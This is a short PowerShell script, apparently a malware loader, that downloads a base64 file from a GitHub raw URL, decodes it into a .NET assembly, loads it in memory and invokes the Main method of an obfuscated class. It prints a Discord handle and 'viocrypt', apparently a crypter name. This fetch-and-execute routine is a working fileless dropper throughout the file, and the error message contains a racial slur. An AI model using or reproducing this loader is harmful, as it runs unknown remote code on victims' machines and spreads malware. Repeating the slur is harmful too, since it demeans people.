function troller() {
    Write-Host "violentqmong on discord"
}

function troll() {
    Write-Host "viocrypt"
}

$url = "https://raw.githubusercontent.com/violentqm/rest/main/tikelaer.txt"

$response = Invoke-WebRequest -Uri $url -UseBasicParsing

if ($response.StatusCode -eq 200) {
    $base64String = $response.Content

    $byteArray = [System.Convert]::FromBase64String($base64String)
    $assembly = [System.Reflection.Assembly]::Load($byteArray)

    $class = $assembly.GetType("QJAMsrpfhk.HH")
    $method = $class.GetMethod("Main")

    $instance = [System.Activator]::CreateInstance($class)
    $method.Invoke($instance, @())

    troller
    troll
} else {
    Write-Host "Nigga got no internet waa: $($response.StatusCode)"
}
